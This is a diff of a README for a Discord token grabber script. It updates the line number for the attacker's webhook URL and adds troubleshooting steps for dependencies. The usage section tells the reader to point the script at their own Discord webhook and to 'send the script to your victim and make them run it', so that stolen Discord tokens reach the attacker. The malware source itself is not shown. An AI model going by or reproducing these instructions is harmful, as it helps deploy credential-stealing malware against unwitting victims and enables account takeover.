@@ -46,9 +46,16 @@ By using **THIS SCRIPT**, you agree that you **hold responsibility** and account
 # How to use
 ```python
  - Create a WebHook on your Discord Server. I recommend creating a New server!
- - Change the 'WEBHOOK_URL' variable value in line 100 to your Discord WebHook URL in token_grabber.py.
+ - Change the 'WEBHOOK_URL' variable value in line 124 to your Discord WebHook URL in token_grabber.py.
  - Send the script to your victim and make them run it!
 ```
 
 ## Output Example
 ![tokengrabber_example.png](https://cdn.discordapp.com/attachments/826581697436581919/984383191618043924/tg.png)
+
+## Errors/Fixes
+
+No module named 'Crypto' or 'Cryptodome'
+> open a cmd and type `pip install pycryptodome==3.14.1`
+
+> You probably have python 3.10 which has some new shit so downgrade to [python 3.9](https://www.python.org/downloads/release/python-3913/)
